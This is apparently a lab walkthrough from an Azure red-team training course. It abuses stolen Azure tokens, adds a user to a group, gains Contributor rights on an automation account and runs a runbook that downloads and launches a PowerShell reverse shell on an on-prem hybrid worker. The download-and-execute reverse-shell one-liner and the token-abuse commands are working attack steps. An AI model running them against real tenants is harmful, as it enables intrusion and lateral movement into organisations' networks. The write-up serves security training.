## Objective 14

```
- Use access token for a user from the reverse shell that we have on defeng-consent to find another user or group that has interesting permissions on an automation account in the defcorphq tenant.
- Abuse the permissions on the automation account to execute a cloud to on-prem lateral movement and get command execution on a hybrid worker. 
```

- Get back the reverse shell on admin-consent by phishing Mark!
```powershell
az ad signed-in-user-show
```
- use `az automation account list` to get information on automation accounts. Please note that it needs automation extension and we may need to run `az extension add --upgrade - n automation` first! 

- Check for objects owned by Mark
```powershell
az ad signed-in-user list-owned-objects
```
![test](/img/obj14a.png "Enumeration")


- To be able to interact with Azure AD, **request a token for the aad-graph**. We can use that token with the Azure AD module. Run the below command on the reverse shell:
```powershell
az account get-access-token --resource-type aad-graph
```
- Use the token on the student VM. Run the following command on the student VM:
```powershell
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$AADToken = 'eyJ0…'
Connect-AzureAD -AadAccessToken $AADToken -TenantId 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
```
- Add Mark as a member of the group
```powershell
Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
```
- Use az cli to check for automation accounts
```powershell
az automation account list
```
Now, we should be able to list roles assigned to Mark using `az role assignment list --assignee MarkDWalden@defcorphq.onmicrosoft.com` on the reverse shell but it does not return an output.

Therefore, we request an access token for ARM and use the one for aad-graph that we requested earlier and use both with Az PowerShell.


- Run the below command on the reverse shell to request an access token for ARM:
```powershell
 az account get-access-token
 ```
 - Use the below command for using both the tokens with Az PowerShell:
 ```powershell
$AADToken = 'eyJ0…'
$AccessToken = 'eyJ0…'
Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
```
- Get the role for Mark (added to the Aumtation Accounts group) on the automation account:
```powershell
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
```
The below output means Mark has Contributor role on the automation account. We can create and execute Runbooks!
![test](/img/obj14b.png "Enumeration")

- Check if a hybrid worker group is in use by the automation account:
```powershell
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
```
We have a hybrid runbookworker. This will allow us to execute commands/scripts on the on-prem infrastructure!
![test](/img/obj14c.png "Enumeration")

Import `C:\AzAD\Tools\studentx.ps1` as a PowerShell runbook. This script downloads the `InvokePowerShellTCP.ps1` reverse shell from your student VM and runs on the hybrid worker. Below are the contents of studentx.ps1. Make sure to modify it to match the IP address of your student VM.
```powershell
iex (New-Object Net.Webclient).downloadstring("http://172.16.x.x:82/InvokePowerShellTcp.ps1")Power -Reverse -IPAddress 172.16.x.x -Port 444
```
- **Import, Publish, Start RunBook**
```powershell
Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```
![test](/img/obj14d.png "Enumeration")
